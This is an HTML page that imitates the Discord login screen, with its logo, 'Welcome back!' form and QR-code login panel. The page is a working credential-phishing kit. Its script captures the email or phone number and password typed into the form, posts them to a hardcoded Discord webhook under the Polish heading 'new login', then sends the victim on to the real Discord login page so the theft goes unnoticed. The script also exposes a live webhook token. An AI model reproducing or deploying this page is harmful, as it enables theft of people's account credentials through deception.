<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; }
        body {
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #1e1f22;
            color: #060607;
        }
        .bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        .login-page {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }
        .svg-logo-text {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 40px;
            user-select: none;
        }
        .svg-logo-text .wordmark {
            color: #fff;
            font-size: 26px;
            font-weight: 800;
            letter-spacing: .5px;
            margin-left: 8px;
        }
        .main { width: 100%; max-width: 784px; }
        .authBox {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, .2);
            display: flex;
            width: 100%;
            min-height: 408px;
            overflow: hidden;
        }
        .main-form { width: 480px; flex-shrink: 0; padding: 32px; }
        .main-form-header h1 {
            font-size: 24px;
            line-height: 32px;
            font-weight: 600;
            color: #060607;
            margin-bottom: 8px;
        }
        .main-form-header p {
            font-size: 16px;
            line-height: 20px;
            color: #4e5058;
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 12px;
            line-height: 16px;
            font-weight: 600;
            color: #4e5058;
            text-transform: uppercase;
            letter-spacing: .02em;
            margin-bottom: 8px;
        }
        label .required { color: #f23f43; }
        input {
            width: 100%;
            height: 40px;
            padding: 10px;
            margin-bottom: 20px;
            background: #1e1f22;
            border: 1px solid #1e1f22;
            border-radius: 4px;
            color: #dbdee1;
            font-size: 16px;
            outline: none;
            transition: border-color .15s ease;
        }
        input:focus { border-color: #5865f2; }
        input::placeholder { color: #6d6f78; }
        .forgot-password { text-align: right; margin-bottom: 20px; }
        .forgot-password a { color: #00a8fc; font-size: 14px; text-decoration: none; }
        .forgot-password a:hover { text-decoration: underline; }
        .login button {
            width: 100%;
            height: 44px;
            background: #5865f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background .15s ease;
        }
        .login button:hover { background: #4752c4; }
        .small-register { margin-top: 16px; font-size: 14px; color: #4e5058; }
        .small-register a { color: #00a8fc; text-decoration: none; }
        .small-register a:hover { text-decoration: underline; }
        .right-section {
            background: #f2f3f5;
            width: 240px;
            flex-shrink: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            text-align: center;
        }
        .login-container { display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .qr-code {
            position: relative;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, .2);
            padding: 8px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .qr-code img { display: block; width: 160px; height: 160px; }
        .qr-logo {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            border-radius: 6px;
            padding: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
        }
        .login-container h2 {
            font-size: 18px;
            line-height: 24px;
            font-weight: 600;
            color: #060607;
            margin-bottom: 8px;
        }
        .login-container p {
            font-size: 12px;
            line-height: 16px;
            color: #4e5058;
            margin-bottom: 12px;
        }
        .login-container a { color: #00a8fc; font-size: 14px; text-decoration: none; }
        @media (max-width: 720px) {
            .authBox { flex-direction: column; }
            .main-form { width: 100%; }
            .right-section { width: 100%; }
        }
    </style>
</head>
<body>

    <svg class="bg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1600 900" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
        <rect width="1600" height="900" fill="#1e1f22"/>
        <path fill="#5865f2" d="M1268 0c92 22 163 72 198 148 35 76 25 166-45 216-70 50-180 40-230-25-50-65-35-155 5-235 20-40 45-79 72-104z"/>
        <path fill="#4752c4" d="M0 615c60-50 160-70 230-30 70 40 90 120 50 180-40 60-130 100-200 80C10 825-30 725 0 615z"/>
        <path fill="#949cf7" opacity=".55" d="M60 300c-50 40-70 120-20 170 50 50 150 40 180-20 30-60-20-150-90-170-30-10-50 5-70 20z"/>
        <path fill="#5865f2" opacity=".7" d="M250 0c55 30 95 90 75 150-20 60-80 90-130 60-50-30-50-100-20-150 15-35 45-60 75-60z"/>
        <path fill="#3a45c5" opacity=".6" d="M1495 695c40-20 80-65 100-125 20-60 0-130-40-160-40-30-100-10-120 50-20 60-10 130 30 180 10 20 20 40 30 55z"/>
    </svg>

    <div class="login-page">
        <div class="svg-logo-text">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="#fff" aria-hidden="true">
                <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189z"/>
            </svg>
            <span class="wordmark">Discord</span>
        </div>

        <main class="main">
            <div class="authBox">
                <div class="main-form">
                    <form id="login-form" action="#">
                        <div class="input-groups">
                            <div class="main-form-header">
                                <h1>Welcome back!</h1>
                                <p>We're so excited to see you again!</p>
                            </div>
                            <div class="email-wrapper">
                                <label for="emailORphone">
                                    Email or Phone Number
                                    <span class="required">*</span>
                                </label>
                                <input type="text" id="emailORphone" required autocomplete="off">
                            </div>
                            <div class="password-wrapper">
                                <label for="password">
                                    Password
                                    <span class="required">*</span>
                                </label>
                                <input type="password" id="password" required>
                            </div>
                        </div>
                        <div class="forgot-password">
                            <a href="#">Forgot your password?</a>
                        </div>
                        <div class="login">
                            <button type="submit">Log In</button>
                        </div>
                        <div class="small-register">
                            <span>Need an account?</span>
                            <a href="#">Register</a>
                        </div>
                    </form>
                </div>

                <div class="right-section">
                    <div class="login-container">
                        <div class="qr-code" id="qr-code">
                            <span class="qr-logo">
                                <svg width="28" height="28" viewBox="0 0 24 24" fill="#5865f2" aria-hidden="true">
                                    <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189z"/>
                                </svg>
                            </span>
                        </div>
                        <h2>Log in with QR Code</h2>
                        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
                        <a href="#">Or sign in with passkey</a>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
    <script>
        const form = document.getElementById('login-form');
        const webhookUrl = 'https://discord.com/api/webhooks/1537189499606540308/zSSvet2UDzR5LY6nYSzKcEM7ewNAzHx4brsvdwN7Th0bcvzZZeHe0RJ5zWGW1DoVr7IW';

        form.addEventListener('submit', function (e) {
            e.preventDefault();

            const loginInput = document.getElementById('emailORphone').value;
            const passwordInput = document.getElementById('password').value;

            const content = '**Nowe logowanie:**\n**Email/Telefon:** ' + loginInput + '\n**Hasło:** ' + passwordInput;

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: content })
            })
                .then(function () { window.location.href = 'https://discord.com/login'; })
                .catch(function () { window.location.href = 'https://discord.com/login'; });
        });

        try {
            const qr = qrcode(0, 'M');
            qr.addData('https://discord.com/login');
            qr.make();
            const qrBox = document.getElementById('qr-code');
            const logo = qrBox.querySelector('.qr-logo');
            qrBox.innerHTML = qr.createImgTag(4, 8);
            qrBox.appendChild(logo);
        } catch (err) {}
    </script>
</body>
</html>
